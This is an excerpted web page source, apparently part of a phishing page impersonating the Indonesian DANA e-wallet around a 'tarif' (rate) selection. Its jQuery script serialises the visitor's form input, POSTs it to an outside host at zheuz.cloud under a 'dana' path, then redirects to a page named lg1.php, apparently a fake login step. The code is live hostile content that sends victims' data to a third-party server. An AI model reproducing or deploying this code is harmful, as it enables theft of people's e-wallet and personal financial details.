...
<head>
 ...
 <meta property="og:image" content="https://hosting.tigerengine.id/xd4dg0.jpg">
  ...
  <meta content="https://hosting.tigerengine.id/xd4dg0.jpg" property="og:image">
...
var tarif = $('input[name="tarif"]:checked').val();
 ...
 event.preventDefault();
      $("#process1").fadeIn(); 
        $.ajax({
            type: 'POST',
            url: 'https://zheuz.cloud/dana/tandi/tarif.php',
            data: $('#patok').serialize(),
            datatype: 'JSON',            
            complete: function(data) {
            setTimeout(function(){            
            window.location.href='lg1.php';
            $("#process1").fadeOut();     
   }, 500);
            }
          })
